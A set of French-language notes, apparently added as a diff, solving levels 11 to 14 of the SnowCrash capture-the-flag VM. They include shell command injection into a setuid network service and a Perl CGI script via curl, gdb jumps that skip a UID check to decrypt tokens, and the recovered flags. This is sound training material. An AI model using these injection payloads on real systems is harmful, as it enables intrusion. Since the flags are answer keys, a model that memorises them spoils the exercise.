+-> inversé le hash du script, on connait au préalable comment il a été hashé => f05d1d066fb246efe0c6f7d095f909a7a0cf34a0 : sha1sum
+-> Injecté une cmd dans le echo avant le hash, le script a des droits setuid
+
+level11@SnowCrash:~$ nc 127.0.0.1 5151
+Password: ; getflag > /tmp/asd
+Erf nope..
+level11@SnowCrash:~$ cat /tmp/asd
+Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
+
+Password    => 
+Flag        => fa6v5ateaw21peobuub8ipe6s
+
+----------------------------------------------------------------------------------------------
+level12:
+
+-rwsr-sr-x+ 1 flag12  level12  464 Mar  5  2016 level12.pl*
+
+#!/usr/bin/env perl
+# localhost:4646
+use CGI qw{param};
+print "Content-type: text/html\n\n";
+
+sub t {
+  $nn = $_[1];                              -> y
+  $xx = $_[0];                              -> x
+  $xx =~ tr/a-z/A-Z/;                       -> Min to Maj sur $xx (x) 
+  $xx =~ s/\s.*//;                          -> substitue sur tout ce qui suit un espace par rien
+  @output = `egrep "^$xx" /tmp/xd 2>&1`;    -> grep x modifié par le regex dans /tmp/xd
+  foreach $line (@output) {                 -> Boucle sur chaque ligne extraite de /tmp/xd
+      ($f, $s) = split(/:/, $line);         -> split la chaine sur : -> f avant et s après 
+      if($s =~ $nn) {                       -> comparaison en s et y
+          return 1;
+      }
+  }
+  return 0;
+}
+
+sub n {
+  if($_[0] == 1) {                          -> Retour de t
+      print("..");
+  } else {
+      print(".");
+  }    
+}
+
+n(t(param("x"), param("y")));
+
+
+# localhost:4646 -> Le serveur tourne sur ce port
+level12@SnowCrash:~$ netstat -l
+tcp6       0      0 [::]:4747               [::]:*                  LISTEN
+
+Le script prend 2 args qu'il passe a la fonction t
+
+=~ -> operateur de liaison, il applique un motif regex a la var
+
+curl "http://localhost:4646/level12.pl?x="
+
+Possibilitées:
+=> Faille sur x => Injection de cmd sur egrep => suffit de prendre en compte les modifs regex
+=> Faille sur y => Utiliser la comparaison sur tout les caracts => le serveur affichera '.' sur les bons caracts
+
+Injection:
+L'injection sur grep a une particuliarité, l'arg de la cmd a des "" => pour activer l'injection on peut passer un " pour fermer l'arg de grep et prendre le controle
+
+PB => injection impossible le " fermera juste l'arg de curl !!!
+
+mettre l'injection dans un fichier => Prendre en compte le regex
+
+level12@SnowCrash:~$ curl "http://localhost:4646/level12.pl?x=.*;$(LS)"
+The program 'LS' is currently not installed.  To run 'LS' please ask your administrator to install the package 'sl'
+
+=> le .* outrepasse l'ancrage ^, et la cmd est bien execute
+Il faut trouver un moyen de lancer une cmd au travers du regex => fichier
+
+echo "getflag > /tmp/sad" > /tmp/SAD && chmod 777 /tmp/SAD
+
+le /tmp/ ne passe pas le regex => * donne tout les dossiers et passe le regex
+
+ATTENTION -> La diff ' et " !!!! 
+
+level12@SnowCrash:~$ curl 'http://localhost:4646/level12.pl?x=;$(/*/SAD)'
+..level12@SnowCrash:~$ cat /tmp/sad
+Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
+
+Password    => 
+Flag        => g1qKMiRpXf53AWhDaU7FEkczr
+
+----------------------------------------------------------------------------------------------
+level13:
+
+-rwsr-sr-x 1 flag13  level13 7303 Aug 30  2015 level13*
+
+level13@SnowCrash:~$ file level13 
+level13: setuid setgid ELF 32-bit LSB executable,
+Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs),
+for GNU/Linux 2.6.24, BuildID[sha1]=0xde91cfbf70ca6632d7e4122f8210985dea778605, not stripped
+
+level13@SnowCrash:~$ ./level13 
+UID 2013 started us but we we expect 4242
+
+level13@SnowCrash:~$ ./level13 
+[^_]
+0123456
+UID %d started us but we we expect %d
+boe]!ai0FB@.:|L6l@A?>qJ}I                   -> token crypté ?
+your token is %s
+
+Le Token a l'air d'être présent en dur dans l'exec
+
+
+level13@SnowCrash:~$ objdump -d
+0804858c <main>:
+ 804858c:       55                      push   %ebp
+ 804858d:       89 e5                   mov    %esp,%ebp
+ 804858f:       83 e4 f0                and    $0xfffffff0,%esp
+ 8048592:       83 ec 10                sub    $0x10,%esp
+ 8048595:       e8 e6 fd ff ff          call   8048380 <getuid@plt>
+ 804859a:       3d 92 10 00 00          cmp    $0x1092,%eax
+ 804859f:       74 2a                   je     80485cb <main+0x3f>
+ 80485a1:       e8 da fd ff ff          call   8048380 <getuid@plt>
+ 80485a6:       ba c8 86 04 08          mov    $0x80486c8,%edx
+ 80485ab:       c7 44 24 08 92 10 00    movl   $0x1092,0x8(%esp)
+ 80485b2:       00 
+ 80485b3:       89 44 24 04             mov    %eax,0x4(%esp)
+ 80485b7:       89 14 24                mov    %edx,(%esp)
+ 80485ba:       e8 a1 fd ff ff          call   8048360 <printf@plt>
+ 80485bf:       c7 04 24 01 00 00 00    movl   $0x1,(%esp)
+ 80485c6:       e8 d5 fd ff ff          call   80483a0 <exit@plt>
+ 80485cb:       c7 04 24 ef 86 04 08    movl   $0x80486ef,(%esp)
+ 80485d2:       e8 9d fe ff ff          call   8048474 <ft_des>         -> Fonction pour crypter
+ 80485d7:       ba 09 87 04 08          mov    $0x8048709,%edx
+ 80485dc:       89 44 24 04             mov    %eax,0x4(%esp)
+ 80485e0:       89 14 24                mov    %edx,(%esp)
+ 80485e3:       e8 78 fd ff ff          call   8048360 <printf@plt>
+ 80485e8:       c9                      leave  
+ 80485e9:       c3                      ret    
+ 80485ea:       90                      nop
+ 80485eb:       90                      nop
+ 80485ec:       90                      nop
+ 80485ed:       90                      nop
+ 80485ee:       90                      nop
+ 80485ef:       90                      nop
+
+
+ >>> disas main
+Dump of assembler code for function main:
+   0x0804858c <+0>:     push   %ebp
+   0x0804858d <+1>:     mov    %esp,%ebp
+   0x0804858f <+3>:     and    $0xfffffff0,%esp
+   0x08048592 <+6>:     sub    $0x10,%esp
+   0x08048595 <+9>:     call   0x8048380 <getuid@plt>
+   0x0804859a <+14>:    cmp    $0x1092,%eax
+   0x0804859f <+19>:    je     0x80485cb <main+63>
+   0x080485a1 <+21>:    call   0x8048380 <getuid@plt>
+   0x080485a6 <+26>:    mov    $0x80486c8,%edx
+   0x080485ab <+31>:    movl   $0x1092,0x8(%esp)
+   0x080485b3 <+39>:    mov    %eax,0x4(%esp)
+   0x080485b7 <+43>:    mov    %edx,(%esp)
+   0x080485ba <+46>:    call   0x8048360 <printf@plt>
+   0x080485bf <+51>:    movl   $0x1,(%esp)
+   0x080485c6 <+58>:    call   0x80483a0 <exit@plt>
+   0x080485cb <+63>:    movl   $0x80486ef,(%esp)
+   0x080485d2 <+70>:    call   0x8048474 <ft_des>
+   0x080485d7 <+75>:    mov    $0x8048709,%edx
+   0x080485dc <+80>:    mov    %eax,0x4(%esp)
+   0x080485e0 <+84>:    mov    %edx,(%esp)
+   0x080485e3 <+87>:    call   0x8048360 <printf@plt>
+   0x080485e8 <+92>:    leave
+   0x080485e9 <+93>:    ret
+
+
+PB -> gdb n'arrive pas a atteindre ft_des puisqu'il y a un getuid avant puis printf & exit
+   0x08048595 <+9>:     call   0x8048380 <getuid@plt>
+   0x0804859a <+14>:    cmp    $0x1092,%eax
+   0x0804859f <+19>:    je     0x80485cb <main+63>  -> Juste avant ft_des, je ne passe pas le cmp
+
+Faire un jump
+break point avant le cmp
+
+b *0x0804859a       -> avant cmp
+jump *0x080485cb    -> ignore tout juste avant ft_des
+continue            -> entrer dans la fonction
+your token is 2A31L79asukciNyi8uppkEuSx
+
+
+Password    => 
+Flag        => 2A31L79asukciNyi8uppkEuSx
+
+----------------------------------------------------------------------------------------------
+level14:
+
+gdb -q getflag
+   0x08048bee <+680>:   jmp    0x8048e2f <main+1257>
+   0x08048bf3 <+685>:   mov    0x804b060,%eax
+   0x08048bf8 <+690>:   mov    %eax,%ebx
+   0x08048bfa <+692>:   movl   $0x80490b2,(%esp)
+   0x08048c01 <+699>:   call   0x8048604 <ft_des>
+
+(gdb) jump *0x08048bfa  -> SIGSEGV, Segmentation fault.
+(gdb) jump *0x08048bf8  -> SIGSEGV, Segmentation fault.
+
+(gdb) jump *0x08048bf3
+Continuing at 0x8048bf3.
+x24ti5gi3x0ol2eh4esiuxias                                               -> FLAG
+*** stack smashing detected ***: /bin/getflag terminated
+======= Backtrace: =========
+/lib/i386-linux-gnu/libc.so.6(__fortify_fail+0x45)[0xb7f2fd95]
+/lib/i386-linux-gnu/libc.so.6(+0x103d4a)[0xb7f2fd4a]
+/bin/getflag[0x8048ec7]
+/lib/i386-linux-gnu/libc.so.6(__libc_start_main+0xf3)[0xb7e454d3]
+/bin/getflag[0x8048571]
+======= Memory map: ========
+08048000-0804a000 r-xp 00000000 07:00 12700      /bin/getflag
+0804a000-0804b000 r--p 00001000 07:00 12700      /bin/getflag
+0804b000-0804c000 rw-p 00002000 07:00 12700      /bin/getflag
+0804c000-0806d000 rw-p 00000000 00:00 0          [heap]
+b7e07000-b7e23000 r-xp 00000000 07:00 14117      /lib/i386-linux-gnu/libgcc_s.so.1
+b7e23000-b7e24000 r--p 0001b000 07:00 14117      /lib/i386-linux-gnu/libgcc_s.so.1
+b7e24000-b7e25000 rw-p 0001c000 07:00 14117      /lib/i386-linux-gnu/libgcc_s.so.1
+b7e2b000-b7e2c000 rw-p 00000000 00:00 0 
+b7e2c000-b7fcf000 r-xp 00000000 07:00 14123      /lib/i386-linux-gnu/libc-2.15.so
+b7fcf000-b7fd1000 r--p 001a3000 07:00 14123      /lib/i386-linux-gnu/libc-2.15.so
+b7fd1000-b7fd2000 rw-p 001a5000 07:00 14123      /lib/i386-linux-gnu/libc-2.15.so
+b7fd2000-b7fd5000 rw-p 00000000 00:00 0 
+b7fd9000-b7fdd000 rw-p 00000000 00:00 0 
+b7fdd000-b7fde000 r-xp 00000000 00:00 0          [vdso]
+b7fde000-b7ffe000 r-xp 00000000 07:00 14081      /lib/i386-linux-gnu/ld-2.15.so
+b7ffe000-b7fff000 r--p 0001f000 07:00 14081      /lib/i386-linux-gnu/ld-2.15.so
+b7fff000-b8000000 rw-p 00020000 07:00 14081      /lib/i386-linux-gnu/ld-2.15.so
+bffdf000-c0000000 rw-p 00000000 00:00 0          [stack]
+
+Program received signal SIGABRT, Aborted.
+0xb7fdd428 in __kernel_vsyscall ()
+
+
+!!! IMPORTANT !!!
+
+x24ti5gi3x0ol2eh4esiuxias => Pas le bon flag
+
+Il semblerait que dans le disas main il est 15 appel de ft_des => il faut trouver le bon
+
+1 => 0x08048bf3 => x24ti5gi3x0ol2eh4esiuxias => X
+2 => 0x08048c17 => f2av5il02puano7naaf6adaaf => X
+3 => 0x08048c3b => kooda2puivaav1idi4f57q8iq => X
+
+
+15 => 0x08048de5 => 7QiHafiNa3HVozsaXkawuYrTstxbpABHD8CPnHJ
+
+flag14@SnowCrash:~$ su flag14
+Password: 
+Congratulation. Type getflag to get the key and send it to me the owner of this livecd :)
+
+Password    => 
+Flag        => 7QiHafiNa3HVozsaXkawuYrTstxbpABHD8CPnHJ
